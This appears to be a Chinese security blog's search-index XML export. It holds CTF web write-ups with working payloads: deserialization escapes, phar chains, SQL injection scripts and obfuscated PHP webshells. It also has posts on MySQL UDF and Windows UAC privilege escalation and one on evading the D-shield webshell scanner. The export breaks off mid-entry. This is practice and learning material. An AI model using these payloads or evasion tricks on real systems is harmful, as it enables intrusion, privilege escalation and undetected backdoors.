<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ctf练习(3)]]></title>
    <url>%2F2019%2F12%2F14%2Fctf%E7%BB%83%E4%B9%A0(3)%2F</url>
    <content type="text"><![CDATA[[0CTF 2016]piapiapia题目页面:打开题目没什么思路,登入不存在sql注入,然后也没有看到注册的页面,在爆破目录的时候也爆破不出来东西404的页面也会返回状态码200且是index.php的内容,在尝试备份备份文件的时候发现了www.zip ,下载后查看发现有几个php文件发现有register.php这个注册页面,首先我们先参数注册然后登入看看里面的内容发现了有个文件上传,尝试上传php文件发现上传成功,访问上传成功后返回的profile.php文件发现并没有解析我们的php文件,而是把我们的php文件内容变成base64生成图片,看来没有办法,只可以进行代码审计,来找了。利用Seay工具自动审计发现了一些有可能存在漏洞的地方。然后经过简单的审计发现只有第三条有可能存在,第一第二条都有过滤,然后第四条他的文件名是结果md5加密过的,文件名不可控。我们看看任意文件读取的,在profile.php中这里他先经过反序列化取出内容,然后读取$profile[‘photo’]这个里面的内容在base64编码,这也就是我们上传的文件会被base64编码显示出来的原因了。然后config.php看到了flag的字样所以大概思路就是我们要让$profile[‘photo’]这个变量是config.php。然后看看$profile[‘photo’]他是怎么赋值的,在update.php中有赋值他是upload/这个路径加上我们文件名的md5来赋值的,这就陷入了死胡同。不过仔细发现他有serialize和unserialize有可能还考的是反序列化的东西,然后知道了我们如果可以控制序列化里面的内容就有可能更改其他属性的内容。例如这样是没什么问题可是如果我们可以控制里面的属性,就可以看到,他里面的内容逃逸出来了,因为他属性中只会匹配属性中长度的值,然后遇到};就会停止反序列化。我们可以通过这个方法来更改他$profile[‘photo’]的值变成config.php,因为我们传入的字符串他在进行序列化的时候,他的长度肯定是足够的,不可能出现长度不够的情况,所以我们要找到一个可以更改序列化长度的地方这里他会进行替换字符串,因为除了where其他都是6个字符串,只有where是5个字符,这里为什么要用5个字符的呢,主要因为他替换后的内容是hacker,hacker是6个字符,多出了一个字符,这样我们就可以插入我们的内容。然后这里我们控制nickname来逃逸,首先要把nickname变成数组,因为上传有限制,要用数组绕过然后我们构造初步的序列化 1a:4:&#123;s:5:&quot;phone&quot;;s:6:&quot;123456&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:4:&quot;test&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/098f6bcd4621d373cade4e832627b4f6&quot;;&#125; 变成 1a:4:&#123;s:5:&quot;phone&quot;;s:6:&quot;123456&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:4:&quot;test &quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; &quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/098f6bcd4621d373cade4e832627b4f6&quot;;&#125; 其中多个空格中间代表我们传入的字符串,&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;},一共有34个字符串,我们就要照出34个where,最后payload 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 然后访问profile.php把那串base64进行解码拿到flag 参考链接https://www.jianshu.com/p/3b44e72444c1https://blog.csdn.net/zz_Caleb/article/details/96777110 [ByteCTF 2019]EZCMS打开页面发现敏感文件 www.zipindex.php页面源代码可以发现只要我们输入的密码不是admin我们就可以登入成功upload.php页面源代码我们可以发送任意后缀的文件,说明存在文件上传漏洞,参数先上传一个php文件上传失败,说我们不是admin用户。在查看了一下源代码发现了,他调用了config.php文件中Admin类里面的upload_file函数,upload_file函数代码他判断checker的值是否为假,如果为假就执行die函数,我们看看checker是怎么定义的他是调用Profile类里面的is_admin()函数,查看此函数的代码他会获取我们的sessoin值然后要变量username的值等于admin,变量password不等于admin,然后拿http头的user里面的值与md5($secret.$username.$password)函数的返回值进行对比,如果相等就返回真,但是user和md5($secret.$username.$password)函数对比的时候不存在弱类型比较,然后进行查看其他函数发现了,我们的cookie有个hash,然后查看了hash的定义发现了他是用md5($secret.&quot;adminadmin&quot;)定义的,只要我们传入的username和password的值都是admin就可以了,可是password的值在我们登入的时候不给等于admin,这里就想到了哈希长度扩展攻击,原理下面有链接,这里直接操作把得到的字符串里面的\x00替换为%00变成 1admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00cuokon 然后把上面那一串当成密码提交,然后hashpump这里也给了md5值,把md5值变成cookie中user的值提交后就可以上传文件了,切记文件上传的时候要有user那个值,否则上传不成功发现已经上传成功了,没有提示其他内容,在访问upload.php就可以得到路径,点击里面的超链接,得到路径后访问发现返回500突然想去他原来就有一个.htaccess文件,他也是一个php的配置文件,我们要把他给删掉,才可以访问我们的php页面发现了他有可能存在phar反序列化,因为在view.php中他调用了config.php文件中的File类,里面的view_detail方法,他用了mime_content_type函数,他有可能导致phar反序列化漏洞然后现在办法就是上传一个phar文件,里面构造了一个可以删除文件的pop链,(因为本人比较菜,没有构造出来看了别人的wp菜知道),然后发现了他的_destruct函数他最后调用了upload_file这个函数,我们可以找一下有__call这个函数的并且没有upload_file函数的类,最后定位到了Profile类他会调用open函数,去php.net网站中找到了一个符合条件的类这里我们使用的是ZipArchive类,也就是第一个函数用法:第一个参数是文件名,第二个参数是用什么方法打开,这里别人都是用2中方法打开就可以导致删除文件所以这里开始构造 1234567891011121314151617181920212223242526&lt;?phpclass File&#123; public $filename; public $filepath; public $checker;&#125; class Profile&#123; public $username; public $password; public $admin;&#125; $o = new File();$o-&gt;checker=new Profile();$o-&gt;checker-&gt;admin=new ZipArchive();$o-&gt;checker-&gt;username="./sandbox/33c6f8457bd77fce0b109b4554e1a95c/.htaccess";$o-&gt;checker-&gt;password=ZIPARCHIVE::OVERWRITE;@unlink("phar.phar");$phar = new Phar("phar.phar");$phar-&gt;startBuffering();$phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;");$phar-&gt;setMetadata($o);$phar-&gt;addFromString("test.txt", "test");$phar-&gt;stopBuffering();?&gt; 注意要在php.ini中配置pharreadonly为Off然后把生成的phar.phar文件上传上去,上传完成后再上传我们的php一句话,因为他有过滤,我们的一句话木马要变形一下 1234&lt;?php$a='syste';$a.='m';$a($_GET[0]); 上传后我们要先触发phar反序列化,然后在访问我们的一句话木马,在触发完phar反序列化后不要访问upload.php因为你访问后他还会生成.htaccessFile类中过滤了很多协议,不过他没有过滤php这个伪协议,然后可以用php://filter/resource=这样绕过直接访问我们的一句话木马发现没有返回500说明成功触发了phar反序列化,这里报错只是我们没有传入变量导致的,执行cat /flag获取flag 参考链接hash长度扩展攻击https://www.cnblogs.com/pcat/p/5478509.htmlhttps://www.freebuf.com/articles/web/31756.htmlhttps://www.freebuf.com/articles/web/69264.html题目详解https://blog.csdn.net/qq_42181428/article/details/100659865https://www.cnblogs.com/hetianlab/p/11926681.html]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctf练习(2)]]></title>
    <url>%2F2019%2F12%2F12%2Fctf%E7%BB%83%E4%B9%A0(2)%2F</url>
    <content type="text"><![CDATA[[HCTF 2018]WarmUp题目页面:查看源代码发现source.php访问source.php可以直接看到php源码然后进行审计第一个if语句,直接判断我们传入的值是否在$whitelist数组里面。第二个if语句,他会先截取问号前面的字符串,然后判断截取后的字符串是否在$whitelist数组里面第三个if语句,他会先url解码,然后在截取问号前面的字符串,最后判断截取后的字符串是否在$whitelist数组里面第一个判断肯定是绕不过去的,第二个的话我们可以构造一个这样的payloadsource.php?../../../../../etc/passwd这样他在第二个判断的时候他会返回true,然后让他被include包含,可是问题来了,因为他是个?后面的字符串会被当做参数传入,不能达到我们要的效果,所以第二个判断也绕不过。第三个判断他会先进行url解码,比第二个判断多了个步骤,那么加了这个后我们就有办法可以绕过了,我们把?进行url编码2次。payload变成source.php%253f../../../../../etc/passwd他在判断的时候会和第二个一样,因为他有个url解码,把我们的%253f变成?,所以他会返回true,然后include会去包含我们的内容因为他那里还有个hint.php我们访问看看发现他说flag在ffffllllaaaagggg我们去包含就可以获得flag了 [SUCTF 2019]CheckIn题目页面:上传一个普通的图片发现他拦截了&lt;?,图片里面不可以出现&lt;?,然后上传一个GIF89a后面接一句话木马上传成功,并且返回了路径和上传后的所有文件名,尝试上传php文件上传失败,然后fuzz过后,发现有ph开头的后缀就会拦截然后看过别人的wp,发现是上传.user.ini文件,他是一个配置文件php配置中有1个配置,可以让php文件都包含一个任意后缀的文件auto_prepend_file=xxx这个配置相当于require(xxx)然后访问上传目录的index.php命令执行成功 [CISCN2019 华北赛区 Day2 Web1]Hack World题目页面:先判断是什么类型的注入,输入1+1发现被拦截,经过测试过滤了*-+等等,我们可以用^或者/来测试,输入2/1返回了2的内容,输入2/2返回了1的内容什么存在数字类型的注入,输入0的话返回的是一个错误,我们可以根据这个来判断这是一个bool类型的注入,然后根据网页显示的内容,我们知道flag在flag表中的flag列中,脚本 1234567891011121314151617181920import requestsimport strings = string.printabledef req(): flag = &apos;&apos; url=&apos;http://7e9d1a4b-e6f7-4e5b-b4cb-564f5eafda81.node3.buuoj.cn/index.php&apos; for i in range(1,70): for j in s: data = &#123; &apos;id&apos;:&apos;(\&apos;&#123;0&#125;\&apos;=ascii((substr((select\nflag\nfrom\nflag),&#123;1&#125;,1))))&apos;.format(ord(j),i) &#125; res = requests.post(url,data=data) text =res.text if(text.find(&apos;glzjin wants a girlfriend&apos;)!=-1): flag += j print(flag) breakreq() Fakebook页面:在join出发现sql注入,抓包,知道username为注入的参数跑到里面的数据都是反序列化的可是没有类,就没有什么办法构造,而且sql注入也没有写shell成功,然后对目录进行了一波爆破,发现有robots.txt和flag.php有备份文件,下载后查看看到curl就想到了是ssrf,代码不是特别难只对blog进行了过滤,要求我们输入以http://和https:// 开头的字符串,只要把blog的地址替换成读取flag的file://协议, 就可以拿到flag然后点击username那个链接输入一个不存在的值发现爆出了绝对路径,然后可以知道flag的绝对路径是/var/www/html/flag.php,然后测试是否有sql注入发现他报错了,而且报错信息是有未闭合的’,所以猜测这里存在sql注入,这里就有思考一下了,他这个地方是从数据库读取反序列化的内容,结果序列化后读取blog的地址,在去用curl请求,那么我们可以让他读取到我们的构造的序列化的内容,替换掉数据库查询的内容,我们可以随便在sqlmap中去一个序列化的内容例如我取O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:16:&quot;cuokon.github.io&quot;;}然后我们修改最后面的blog字符串长度和blog的地址,变成 1O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125; 然后构造sql语句 1no=0 union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;; 这里用/**/的原因是union和select不能在一起,否则会被拦截然后因为他把内容放在图片上进行了base64加密,我们右键查看源代码就可以拿到里面的内容了base64解密]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctf练习(1)]]></title>
    <url>%2F2019%2F12%2F10%2Fctf%E7%BB%83%E4%B9%A0(1)%2F</url>
    <content type="text"><![CDATA[[强网杯 2019]高明的黑客访问页面可以看到网站源码备份在 www.tar.gz 那直接访问页面下载就可以了。下载后发现一堆乱七八糟的文件,而且有上千个然后用代码审计工具发现里面有很多文件有可执行命令的函数和其他一些危险的函数初步猜测里面可能是有一个后门,要我们去发现。可是有3千多个文件,而且参数也非常的多,不可能一个一个的去猜测,肯定是要通过脚本去发现后门页面。这里有一个小问题,怎么去判断页面是否是有漏洞的页面,我们可以用一个echo 一个标记的东西,在用正则表达式去匹配这个标记,如果匹配到了就代表是那个页面了。用echo原因是不管system函数或者eval函数都是可以得到我们标记的东西。脚本写的比较菜,记得修改路径 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import threadingimport requestsimport reimport osrget = re.compile(r&apos;\$_GET\[[\&apos;&quot;](.*?)[\&apos;&quot;]\]&apos;)rpost = re.compile(r&apos;\$_POST\[[\&apos;&quot;](.*?)[\&apos;&quot;]\]&apos;)flag = re.compile(r&apos;&lt;pre&gt;This is Shell (.*?)&lt;/pre&gt;&apos;)def GetFilename(): os.chdir(&quot;/root/www/src/&quot;) filename = os.listdir(&apos;./&apos;) return filenamedef GetParameter(text): lget = &apos;&apos; lpost = &apos;&apos; get = &quot;&quot; post = dict() lget = rget.findall(text) lpost = rpost.findall(text) for i in lget: get+=i+&apos;=echo &quot;&lt;pre&gt;This is Shell &apos;+i+&apos;&lt;/pre&gt;&quot;&amp;&apos; for i in lpost: post[i]=&apos;echo &quot;&lt;pre&gt;This is Shell&gt; &apos;+i+&apos;/pre&gt;&quot;&amp;&apos; request = [get,post] return requestdef req(filelist): for i in filelist: with open(i) as f: try: get,data = GetParameter(f.read()) url = &quot;http://89594ab0-1881-42a7-bd87-6c01a1a1f9e3.node3.buuoj.cn/&quot;+i+&apos;?&apos;+get response = requests.post(url,data=data,timeout=2).text result = flag.search(response) if(result): print(&apos;-&apos;*40) print(i) print(result.group(1)) return else: print(i+&quot; pass&quot;) except: print(i+&quot; error&quot;) passfilelist=GetFilename()req(filelist) 运行脚本后:得到后就可以查看flag了 [强网杯 2019]随便注打开题目输入一个’看看是否有明显的注入点直接就报错了,那说明这里肯定有注入点,尝试一下union select发现被过滤了很多关键的字符,那mysql还有什么关键字是没有被过滤的呢,这里就想到了show这个关键字,可是show关键字只可以查看数据库,所有表列都查询不到,这个问题到下面的时候在详细解决,先把能利用的全部利用上首先查看当前数据库下的所有表,要用联合注入1&#39;;show tables#发现了有2个表1.19198109311145142.words然后查看一下表的结构,这里可以用desc这个关键字,他用来查看表的属性 11&apos;;desc `1919810931114514`# 可以看到他有1个列flag这个列然后继续查看words表 11&apos;;desc `words`# words有2个列id和data 然后通过简单的发现,他用的是words这个表,因为如果用1919810931114514这个表的话就直接把flag查询出来了。那接下来我们可以吧1919810931114514表的属性修改成和words表一样的属性,然后把words重命名为words1,把1919810931114514重命名为words这样他在查询的时候会直接查询到我们的flag。1.先增加1919810931114514的id列2.在把1919810931114514的flag列名重命名为data3.然后修改words的名字,并且修改1919810931114514的名字第三步骤要一次性搞定下面是对应的语句1.添加id列 11&apos;;alter table `1919810931114514` add id int not null auto_increment primary key# 2.重命名flag列名为data列名 11&apos;;alter table `1919810931114514` change flag data varchar(100)# 3.对2个数据库进行重命名 11&apos;;rename table words to words1;rename table `1919810931114514` to words# 依次执行上面语句,可以没执行一个语句就可以用desc去查看是否把表的属性改变成功。最后输入个1就可以查看flag了另外发现别人的wp还有另外一种方法,非常简单,可以用Mysql预编译去查看flag 1234set @sql=concat(&apos;selec&apos;,&apos;t flag from `1919810931114514`&apos;);prepare presql from @sql;execute presql;deallocate prepare presql; 然后初步的payload 10&apos;;set @sql=concat(&apos;selec&apos;,&apos;t flag from `1919810931114514`&apos;);prepare presql from @sql;execute presql;deallocate prepare presql;# 然后发现被strstr被拦截了因为strstr是对大小写敏感的,所有可以用大小写绕过,最终payload 10&apos;;SEt @sql=concat(&apos;selec&apos;,&apos;t flag from `1919810931114514`&apos;);prEpare presql from @sql;execute presql;deallocate PrEpare presql;# [RoarCTF 2019]Easy Calc打开页面然后提交表单的时候看到calc.php,访问calc.php发现源码简单来说就是过滤了一些符号,然后只要没有出现那些符号就可以执行命令,其实如果是这样的话就很简单了,可惜事与愿违他用了waf之类的防护软件,然后看了别人的wp才知道可以在?后面加个空格然后在接参数,然后就可以绕过waf,主要原理是waf认为我们传入的参数是num,不是waf要拦截的num,然后php接收的时候还是num所以我们就可以通过这样绕过。然后因为他disable_functions过滤了大部分参数,不过我们还有scandir这个函数,我们可以用这个函数去查看flag在哪里,可是因为我们不能输入单引号和双引号,这里我们可以用chr函数把字符的ascii码变成字符,最后在根目录发现flagpayload 1http://node3.buuoj.cn:27455/calc.php?%20num=1;print_r(scandir(chr(46).chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47))) 然后后show_source来读取f1agg ,payload 1http://node3.buuoj.cn:27455/calc.php?%20num=1;show_source(chr(46).chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[udf提权]]></title>
    <url>%2F2019%2F12%2F09%2Fudf%E6%8F%90%E6%9D%83%2F</url>
    <content type="text"><![CDATA[udf提权udf是mysql的自定义函数,扩展函数,我们可以添加一个执行系统命令的系统函数,来获得权限。在winodw下一般mysql服务的权限都是比较高的,我们执行的系统命令都是用mysql服务的权限去执行系统命令的。 利用条件:1.知道数据库的root用户和密码2.对mysql目录有可读可写的权限 试验首先用命令show variables like &quot;%plugin%&quot;查看插件路径因为一般都没有lib目录和plugin目录,所以要我们创建者2个目录,创建完目录后,查看一下mysql的是多少位的mysql -Vsqlmap文件里面有自带的udf提权的dll文件,我们可以用他来进行提权。路径是:sqlmap\data\udf\mysql\windows\里面有32位和64位的自行选择,然后用sqlmap\extra\cloak\clock.py来生成dll文件python clock.py -d -i lib_mysqludf_sys.dll_,路径自己改会在lib_mysqludf_sys.dll_所在的目录生成lib_mysqludf_sys.dll文件然后把lib_mysqludf_sys.dll发到plugin那个目录,用mysql创建自定义函数create function sys_eval returns string soname &#39;lib_mysqludf_sys.dll&#39;;可以看到函数创建成功,然后看看自己的权限已经是管理员的权限了]]></content>
      <categories>
        <category>技术实战</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-1388UAC提权复现]]></title>
    <url>%2F2019%2F11%2F28%2FCVE-2019-1388UAC%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[漏洞简介该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——Secure Desktop。这些提示是由名为consent.exe的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。因为用户可以与该UI交互，因此对UI来说紧限制是必须的。否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作。即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。事实上，UAC会话中含有尽可能少的点击操作选项。利用该漏洞很容易就可以提升权限到SYSTEM 漏洞影响范围Windows 2008r2 7601 link OPENED AS SYSTEMWindows 2012r2 9600 link OPENED AS SYSTEMWindows 2016 14393 link OPENED AS SYSTEMWindows 2019 17763 link NOT openedWindows 7 SP1 7601 link OPENED AS SYSTEMWindows 8 9200 link OPENED AS SYSTEMWindows 8.1 9600 link OPENED AS SYSTEMWindows 10 1511 10240 link OPENED AS SYSTEMWindows 10 1607 14393 link OPENED AS SYSTEMWindows 10 1703 15063 link NOT openedWindows 10 1709 16299 link NOT opened 漏洞复现Windows 2012 Windows 7 Windows 2008r2 工具https://github.com/jas502n/CVE-2019-1388/]]></content>
      <categories>
        <category>技术实战</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[过D]]></title>
    <url>%2F2019%2F11%2F26%2F%E8%BF%87D%2F</url>
    <content type="text"><![CDATA[引言在打nctf的时候,由一道ctf题目引发的过D盾的思路 过Dget_defined_functions()函数会返回一个2维数组,里面包括了所有的函数,还有自定义的函数 这里就有2个思路了一个是通过自己写的函数去执行,或者可以通过自带的函数例如assert去执行先写一个自带的函数去执行内容的代码 123&lt;?php$a=get_defined_functions();$a['internal'][850]($_GET['a']); //850是assert函数的位置 被杀了,说是变量函数,然后测试了一下发现填什么都会报这个,最后在试了一下填函数的话他只是报了个1,而且这个一级只要随便填充点垃圾数据就过去了 图片语法肯定是错的,只是想说明填函数不容易被杀。既然填函数不容易被杀,那么我们是不是可以找一个获取指定字符串在数组中位置的函数。也就是array_search这个函数 最终的代码 1234&lt;?php$a=get_defined_functions();$a['internal'][array_search('assert',$a['internal'])]($_GET['a']);?&gt; 深入研究其实主要原因是并不是因为get_defined_functions是偏僻函数,而是因为D盾对函数检测的返回值没有特别严格,例如 1234&lt;?php$a[0]='assert';$a[array_search('assert',$a)]($_GET['a']);?&gt; 还有就是我在星球分享绕过D盾的思路那篇文章,也是利用函数返回值绕过D盾的。所以我们可以多利用函数的返回值进行绕过。]]></content>
      <categories>
        <category>技术实战</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019nctf wp(web,misc)]]></title>
    <url>%2F2019%2F11%2F24%2Fnctf%2F</url>
    <content type="text"><![CDATA[WEBFake XML cookbook题目已经说了flag在根目录,所以只要用XXE访问到根目录就可以了 easyphp简单的代码看了一下他一共有3个关卡,1.传入的num的值不可以等于23333,并且这个值要被正则表达式/^23333$/匹配到2.传入str1和str2的md5值不可以一样,但是经过strtr函数替换后的md5值要一样3.传入的参数不可以大于8个字符,参数中不可以包含_字符,然后对$cmd用空额进行分割里面的参数不可以出现cat命令 解题思路:1.在传入换行符的时候,可以让/^$/匹配到(fuzz发现的),所以我们主要传入23333%0a就可以绕过第一关2.如果一个md5是0e开头且后面都是数字的2个md5进行弱类型比较的时候,会一样,因为strtr函数里面他回把c替换为0,所以我们只要找到ce开头的且后面都是数字的md5值就可以绕过3.在传入get参数时,如果参数包括.就会自动替换为_,因为我们传入的字符不可以大于8并且不可以用cat命令,那么我们可以用tac(查看内容并且进行反转)代替cat,然后我们可以用通配符*来减短长度 绕过第一关传入参数num=23333%0a 绕过第二关我们可以用脚本进行爆破md5值脚本 123456&lt;?phpfor($i=0;$i&lt;100000000000;$i++)&#123; if(preg_match("/^ce\d&#123;30&#125;$/",md5($i))) echo $i."\n";&#125;?&gt; 传入参数str1=586180707&amp;str2=1000766792 绕过第三我们要先查看flag文件在哪里,传入参数q.w.q=ls因为当前只有一个f开头的文件,所以我们可以用通配符*来绕过长度限制,传入参数q.w.q=tac f*然后在用linux把内容反过来,就可以拿到flag replace打开页面发现就是一个替换字符串的,然后在随便乱点是时候看到了一个hint.php刚开始看到还有点懵,然后在无意间在替换的时候,发现他报错了然后看到报错信息,有个preg_replace正则替换函数,然后上面php5.6就想到了,他应该是有用/e去匹配,然后有对替换的内容进行eval处理,导致命令执行 先执行一个phpinfo()然后执行命令的时候发现被拦截了然后通过fuzz发现,会过滤’号然后可以用eval($_GET[0]),这样来执行命令就不会出现单引号然后在根目录发现flag,然后查看即可 Upload your Shell题目说要找到上传点,然后在进行骚操作。点击头像发现,有image的字样。然后点进去发现上传点观察url发现,他有可能存在文件包含,然后试着去包含/etc/passwd能不能返回内容思路就是:上传个图片里面藏有一句话木马,然后利用文件包含去包含就可以了。 在正常上传图片的时候,发现竟然被拦截了通过他拦截信息可以知道,内容不可以用&lt;?的字符,有可能是图片中包含了这些字符所以被拦截了。我们可以只取图片的头部分然后在上传(只要把中间的大部分内容给删掉就可以了,如果还提示&lt;?拦截的消息就继续删),然后再次上传。发现他说,图片上传成功但是不可以获取到flag值,那我们在里面传入一句话木马就可以了,因为他过滤了&lt;?所以我们要用其他标签代替&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;代替。最终payload 1&lt;script language="php"&gt;eval($_REQUEST[0])&lt;/script&gt; 提示上传成功然后用文件包含去包含就可以拿到flag了 hacker_backdoor题目说:黑客写的一句话木马,然后我们要利用一句话木马去执行命令然后通过简单的审计,有2个条件1.要指定一个存在的目录2.不可以出现函数的字符串 其实绕过也很简单 ./目录这个代表当前文件,所以肯定是存在的 既然我们不可以传入函数字符串,那么我们可以对函数的字符串进行拆分,然后在执行(php有变量函数这种语法) 首页执行一个phpinfo命令,传入如下payload$a=&#39;php&#39;;$a.=&#39;info&#39;;$a();命令执行成功,但是通过disable_functions发现禁用了大部分命令执行函数,和其他文件操作的函数,但是经过黑名单对比,发现了漏了一个命令执行函数proc_open(),然后查看别人使用方法 1234567891011&lt;?php $test = "whoami"; $array =array( array("pipe","r"), //标准输入 array("pipe","w"), //标准输出内容 array("pipe","w") //标准输出错误 ); $fp = proc_open($test,$array,$pipes); //打开一个进程通道 echo stream_get_contents($pipes[1]); //为什么是$pipes[1]，因为1是输出内容 proc_close($fp); 然后因为一些限制,例如array他不是一个函数所以就不可以用变量函数来代替,然后就替换为了[]来代替数组,还有echo也是一样,但是可以用print_r来代替。因为里面的一些变量和字符串也存在函数名,所以也要替换。最后修改后的payload 1234567891011121314151617&lt;?php$test = &quot;whoami&quot;;$p=&quot;pr&quot;;$p.=&apos;oc_&apos;;$p.=&apos;open&apos;;$ec=&quot;prin&quot;;$ec.=&quot;t_r&quot;;$s=&apos;st&apos;;$s.=&apos;r&apos;;$s.=&apos;eam&apos;;$s.=&apos;_ge&apos;;$s.=&apos;t_co&apos;;$s.=&apos;nten&apos;;$s.=&apos;ts&apos;;$array = [[&quot;p&quot;.&quot;i&quot;.&quot;pe&quot;,&quot;r&quot;],[&quot;p&quot;.&quot;i&quot;.&quot;pe&quot;,&quot;w&quot;],[&quot;p&quot;.&quot;i&quot;.&quot;pe&quot;,&quot;w&quot;]];$fp = $p($test,$array,$pes);$ec($s($pes[1])); 然后去掉换行符并且进行进行url编码最后变成 1$test%20=%20%22whoami%22;$p%20=%20%22pr%22;$p.=%27oc_%27;$p.=%27open%27;$ec=%22prin%22;$ec.=%22t_r%22;$s=%27st%27;$s.=%27r%27;$s.=%27eam%27;$s.=%27_ge%27;$s.=%27t_co%27;$s.=%27nten%27;$s.=%27ts%27;$array%20=%20[[%22p%22.%22i%22.%22pe%22,%22r%22],[%22p%22.%22i%22.%22pe%22,%22w%22],[%22p%22.%22i%22.%22pe%22,%22w%22]];$fp%20=%20$p($test,$array,$pes);$ec($s($pes[1])); 命令执行成功,然后在根目录发现flag,但是有个问题出现了,他的flag不可读但是还发现里面有个readflag,然后试着打开看看里面的内容他是一个elf可执行文件,然后在里面还有/bin/cat flag的字样,猜测他就是用来查看flag的,然后运行这个elf文件 MISCa_good_idea打开就是一张图片然后用binwalk进行分析发现了他内藏其他的图片,然后进行分离(加个-e)参数发现有个hint.txt查看后经过翻译后的内容是:试着找出像素的秘密然后用Stegsolve.jar进行分析,先打个第二个图片,用里面图片组合器,选择第一张图片进行处理然后点了几下按钮,发现了二维码,扫码拿flag What’s this里面是数据包,数据非常小,就是有个传了个压缩文件打开发现是密码,然后发现是伪加密,修改16进制位,把09标志位变成00(如果有些压缩软件说这不是一个有效的压缩包,就要把http头部内容删掉)然后查看里面的文件发现了一堆base64怀疑是base64隐写,利用别人的脚本进行解密,这里打开的是1.txt记得对文件重命名 1234567891011121314151617181920212223242526272829303132333435def get_base64_diff_value(s1, s2): base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' res = 0 for i in xrange(len(s2)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open('1.txt', 'rb') as f: file_lines = f.readlines() bin_str = '' for line in file_lines: steg_line = line.replace('\n', '') norm_line = line.replace('\n', '').decode('base64').encode('base64').replace('\n', '') diff = get_base64_diff_value(steg_line, norm_line) print diff pads_num = steg_line.count('=') if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += '0' * pads_num * 2 print goflag(bin_str)def goflag(bin_str): res_str = '' for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i + 8], 2)) return res_strif __name__ == '__main__': solve_stego() 结束感言nctf给我的感觉还是不错的,虽然总排名在69,但是比以前有点进步。至少不在是签到提选手了。没有白费这1个月天天刷ctf的时间。加油!加油!!!]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql过狗(联合注入)]]></title>
    <url>%2F2019%2F10%2F10%2Fsql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)%2F</url>
